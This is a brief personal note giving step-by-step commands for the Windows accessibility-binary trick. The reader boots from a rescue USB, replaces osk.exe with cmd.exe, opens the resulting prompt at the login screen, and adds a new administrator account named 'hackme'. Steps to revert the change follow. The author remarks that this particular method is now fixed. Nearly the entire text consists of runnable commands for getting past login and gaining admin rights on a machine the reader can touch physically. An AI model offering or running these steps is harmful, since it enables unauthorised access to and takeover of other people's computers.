# windows method that replaced sticky keys or the on screen keyboard with the command prompt, so you could execute it before login
# this prompt would have admin access, and you could add new users, change passwords etc.
# this is fixed now, but there is a new method available.

# this was the original method:
burn hirens boot cd (a linux distro might work too) to usb
boot with device usb
(go to right drive, e.g. F:)
cd \Windows\System32
copy osk.exe osk.exe.bak
copy cmd.exe osk.exe
: reboot, go to on screen keyboard
net user /add hackme password
net localgroup administrators hackme /add

# to undo this:
net users hackme /delete
del \Users\hackme
boot to hirens usb
(go to right drive, e.g. F:)
cd \Windows\System32
copy osk.exe.bak osk.exe
